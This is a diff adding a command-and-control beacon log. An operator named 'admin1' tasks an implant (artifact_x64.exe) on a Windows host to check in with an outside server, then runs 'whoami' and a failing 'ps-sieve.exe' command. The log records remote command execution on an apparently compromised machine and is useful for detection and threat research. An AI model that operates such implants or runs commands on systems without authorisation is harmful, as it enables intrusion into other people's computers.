@@ -1,0 +1,25 @@
+11/19 03:43:50 UTC [metadata] 23.158.104.160 <- 192.168.1.13; computer: NOT-FOUND-404; user: kaeiy; process: artifact_x64.exe; pid: 17916; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+11/19 03:43:50 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/19 03:43:50 UTC [note] Bid: 1516312418  NT: 6.2
+11/19 03:43:50 UTC [task] <T1029> Tasked beacon to become interactive
+11/19 03:44:50 UTC [checkin] host called home, sent: 32 bytes
+11/19 03:45:53 UTC [input] <admin1> sleep 0
+11/19 03:45:53 UTC [task] <T1029> Tasked beacon to become interactive
+11/19 03:45:54 UTC [checkin] host called home, sent: 16 bytes
+11/19 03:45:59 UTC [input] <admin1> shell whoami
+11/19 03:45:59 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 03:46:00 UTC [checkin] host called home, sent: 37 bytes
+11/19 03:46:02 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+11/19 03:46:03 UTC [input] <admin1> shell ps-sieve.exe
+11/19 03:46:03 UTC [task] <T1059> Tasked beacon to run: ps-sieve.exe
+11/19 03:46:04 UTC [checkin] host called home, sent: 43 bytes
+11/19 03:46:05 UTC [output]
+received output:
+'ps-sieve.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
